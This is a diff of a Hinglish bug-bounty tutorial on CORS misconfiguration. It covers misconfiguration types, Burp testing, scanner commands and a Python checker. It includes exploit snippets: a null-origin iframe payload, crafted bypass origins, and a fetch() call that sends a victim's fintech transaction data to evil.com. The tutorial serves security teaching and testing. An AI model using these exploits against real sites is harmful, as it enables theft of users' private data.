@@ -1,18 +1,13 @@
 # :globe_with_meridians: CORS Misconfiguration Cross-Origin Resource Sharing: Wrong Settings Se User Data Steal Karo! (Hinglish Mein)
 
-> **Original Source:** [CORS Misconfiguration Cross-Origin Resource Sharing: Wrong Settings Se User Data Steal Karo! (Hinglish Mein)](https://infosecwriteups.com/cors-misconfiguration-cross-origin-resource-sharing-wrong-settings-se-user-data-steal-karo-ea1eb50ee132)
-> **Platform:** infosecwriteups.com | **Category:** `WEB`
-
 ---
 
 # CORS Misconfiguration Cross-Origin Resource Sharing: Wrong Settings Se User Data Steal Karo! (Hinglish Mein)
-
 
 Series: Bug Bounty Zero se Hero 🦸 | Article #18
 *By HackerMD | 17 min read*
 
 ## Aaj Kya Seekhenge?
-
 
 - CORS kya hai bilkul basics se
 
@@ -32,15 +27,11 @@ Series: Bug Bounty Zero se Hero 🦸 | Article #18
 
 Kyun zaroori hai? CORS misconfiguration ek silent killer hai dikhta nahi, lekin attacker tumhare logged-in session se silently API calls karke data steal kar sakta hai! Banks, fintech apps, health apps sab affected ho sakte hain! Bounty: $500 se $5,000+
 
-
 ## CORS Kya Hai? Pehle Same-Origin Policy Samjho
-
 
 ## Same-Origin Policy (SOP):
 
-
 Browser ka ek security rule hai:
-
 
 ```
 Evil.com pe ek page hai
@@ -57,9 +48,7 @@ https://evil.com:443/api ❌ Different domain
 https://bank.com:8080/api ❌ Different port
 ```
 
-
 ## CORS Kya Karta Hai?
-
 
 ```
 Lekin legitimate use cases hain:
@@ -74,9 +63,7 @@ Access-Control-Allow-Origin: https://frontend.app.com
 → Ab browser allow karta hai!
 ```
 
-
 ## Misconfiguration Kab Hoti Hai?
-
 
 ```
 Developer ne galti se:
@@ -88,12 +75,9 @@ Access-Control-Allow-Origin: [ATTACKER INPUT]
 Yahi hai CORS Misconfiguration! 😱
 ```
 
-
 ## PART 2: CORS Misconfiguration Types
 
-
 ## Type 1: Wildcard Origin Sabse Basic
-
 
 ```
 Request:
@@ -109,9 +93,7 @@ Wildcard (*) + Credentials = Dangerous combo!
 lekin kuch implementations mein bypass possible!)
 ```
 
-
 ## Type 2: Origin Reflection Sabse Common Bug!
-
 
 ```
 Request:
@@ -127,9 +109,7 @@ Koi validation nahi!
 → Koi bhi origin se data steal! 🔴
 ```
 
-
 ## Type 3: Null Origin Bypass
-
 
 ```
 Request:
@@ -154,9 +134,7 @@ fetch('https://target.com/api/data', {credentials:'include'})
 </iframe>
 ```
 
-
 ## Type 4: Subdomain Wildcard Misconfiguration
-
 
 ```
 # Server check karta hai:
@@ -175,9 +153,7 @@ Origin: https://target.com.evil.com
 → Ends with "target.com" check bypass!
 ```
 
-
 ## Type 5: HTTP → HTTPS Trust
-
 
 ```
 # Secure site HTTP origins trust kare:
@@ -191,9 +167,7 @@ HTTP = Man-in-the-middle possible!
 HTTPS site HTTP trust kare = Security issue!
 ```
 
-
 ## Type 6: Special Characters Bypass
-
 
 ```
 # Kuch implementations mein:
@@ -205,12 +179,9 @@ Origin: https://target.com$.evil.com
 toh bypass possible!
 ```
 
-
 ## PART 3: Manual Testing Step by Step
 
-
 ## Step 1: Burp Suite Se Origin Header Add Karo
-
 
 ```
 # Normal request:
@@ -230,9 +201,7 @@ Access-Control-Allow-Credentials: true ← Credentials!
 → CORS Misconfiguration! 🎯
 ```
 
-
 ## Step 2: Different Origins Test Karo
-
 
 ```
 # Test origins list:
@@ -246,9 +215,7 @@ https://subdomain.target.com
 https://notarget.com
 ```
 
-
 ## Step 3: Credentials Check Karo
-
 
 ```
 # Sirf ACAO header enough nahi hai!
@@ -263,9 +230,7 @@ Access-Control-Allow-Origin: * ✅
 Access-Control-Allow-Credentials: (missing/false) ❌
 ```
 
-
 ## Step 4: Pre-flight Request Test
-
 
 ```
 # Complex requests ke liye browser OPTIONS bhejta hai:
@@ -283,12 +248,9 @@ Access-Control-Allow-Credentials: true
 → Pre-flight bhi bypass! 🔴
 ```
 
-
 ## PART 4: Real Exploit Data Steal PoC
 
-
 ## Basic CORS Exploit:
-
 
 ```
 <!-- evil.com/exploit.html -->
@@ -313,9 +275,7 @@ document.body.innerHTML = "Page loaded!";
 </html>
 ```
 
-
 ## Advanced Exploit Full Account Data Steal:
-
 
 ```
 <!-- evil.com/advanced_exploit.html -->
@@ -368,9 +328,7 @@ stealData();
 </html>
 ```
 
-
 ## Null Origin Exploit:
-
 
 ```
 <!-- Sandbox iframe trick -->
@@ -389,12 +347,9 @@ req.send();
 </iframe>
 ```
 
-
 ## PART 5: Automated Testing Tools
 
-
 ## Tool 1: CORScanner
-
 
 ```
 # Install karo
@@ -410,9 +365,7 @@ corscanner -i targets.txt
 corscanner -u https://target.com -v
 ```
 
-
 ## Tool 2: Nuclei CORS Templates
-
 
 ```
 # Nuclei se automated check
@@ -426,9 +379,7 @@ nuclei -l targets.txt \
 -o cors_results.txt
 ```
 
-
 ## Tool 3: Burp Suite Passive Scan
-
 
 ```
 1. Burp Suite Pro → Scanner
@@ -436,9 +387,7 @@ nuclei -l targets.txt \
 3. Manual verification karo
 ```
 
-
 ## Tool 4: Custom Python Script
-
 
 ```
 #!/usr/bin/env python3
@@ -490,9 +439,7 @@ else "https://target.com/api/user"
 check_cors(TARGET_URL, ORIGINS)
 ```
 
-
 ## PART 6: Elite CORS Hunting Workflow
-
 
 ```
 #!/bin/bash
@@ -560,9 +507,7 @@ echo "CORS Vulnerable: $(cat $DIR/cors_vulnerable.txt \
 echo "Results in : $DIR/"
 ```
 
-
 ## CORS Cheat Sheet Quick Reference
-
 
 ```
 # ─── DETECTION HEADERS ───────────────────
@@ -596,9 +541,7 @@ nuclei -tags cors → Template scan
 Burp Suite + Origin header → Manual test
 ```
 
-
 ## Impact Levels Bounty Guide
-
 
 ```
 🟢 Low Impact ($100-300):
@@ -625,9 +568,7 @@ Burp Suite + Origin header → Manual test
 → PII mass exposure
 ```
 
-
 ## Aaj Ka Homework
-
 
 ```
 # 1. CORScanner install karo:
@@ -653,9 +594,7 @@ https://httpbin.org/get
 # Pehli CORS misconfiguration kahan dhundhi?
 ```
 
-
 ## Quick Revision
-
 
 ```
 🔀 CORS = Cross-Origin Resource Sharing
@@ -670,12 +609,9 @@ Subdomain confusion, HTTP trust
 💰 Max Impact = Sensitive API + credentials = High!
 ```
 
-
 ## Meri Baat…
 
-
 Ek fintech app pe maine `/api/v2/transactions` endpoint pe test kiya:
-
 
 ```
 curl -I \
@@ -684,9 +620,7 @@ curl -I \
 https://target-fintech.com/api/v2/transactions
 ```
 
-
 Response:
-
 
 ```
 HTTP/2 200
@@ -695,9 +629,7 @@ Access-Control-Allow-Credentials: true
 Content-Type: application/json
 ```
 
-
 Maine exploit banaya:
-
 
 ```
 fetch('https://target-fintech.com/api/v2/transactions', {
@@ -708,32 +640,21 @@ fetch('https://evil.com/steal?d=' + btoa(JSON.stringify(data)));
 });
 ```
 
-
 Victim ka poora transaction history agar woh mera malicious page visit kare!
-
 
 ## Get Hacker MD’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
-
 
 Remember me for faster sign in
 
-
 Company ko report kiya:
-
 
 Bounty: $2,500 High! 🎉
 
+Lesson: CORS sirf ek header change hai lekin impact bahut bada ho sakta hai! Har API endpoint pe test karo!*HackerMD Bug Bounty Hunter | Cybersecurity ResearcherGitHub: *[BotGJ16](https://github.com/BotGJ16)* | Medium: *@HackerMD
 
-Lesson: CORS sirf ek header change hai lekin impact bahut bada ho sakta hai! Har API endpoint pe test karo!*HackerMD Bug Bounty Hunter | Cybersecurity ResearcherGitHub: *[BotGJ16](https://github.com/BotGJ16)* | Medium: *[@HackerMD](https://medium.com/@HackerMD)
-
-
-*Previous: *[Article #17 SSRF](https://medium.com/@HackerMD)
+*Previous: *Article #17 SSRF
 *Next: Article #19 CSRF: Cross-Site Request Forgery#CORS #CORSMisconfiguration #BugBounty #WebSecurity #EthicalHacking #Hinglish #OWASP #HackerMD*
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/cors-misconfiguration-cross-origin-resource-sharing-wrong-settings-se-user-data-steal-karo-ea1eb50ee132). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
